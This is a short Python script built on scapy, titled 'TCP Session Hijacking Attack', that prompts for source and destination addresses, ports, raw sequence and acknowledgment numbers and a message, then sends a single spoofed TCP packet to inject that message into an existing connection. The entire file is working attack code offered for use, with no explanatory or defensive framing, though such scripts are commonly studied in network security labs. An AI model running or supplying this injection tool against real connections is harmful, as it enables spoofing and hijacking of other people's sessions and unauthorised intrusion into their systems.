from scapy.all import *

print("-"*50)
print("-"*10,"TCP Session Hijacking Attack","-"*10)
print("-"*50)

src_ip = input('Source IP Address: ')
dst_ip = input('Destination IP Address: ')
src_port = int(input('Source Port: '))
dst_port = int(input('Destination Port: '))
seq_num = int(input('Sequence Number (raw): '))
ack_num = int(input('Acknowledgment number (raw): '))
data = input('Message: ')

print("Sending Session Hijacking Packet.......")

IPLayer = IP(src=src_ip,dst=dst_ip)
TCPLayer = TCP(sport=src_port, dport=dst_port, flags=0x018,seq=seq_num, ack=ack_num)
pkt = IPLayer/TCPLayer/str(data)
send(pkt,verbose=0)
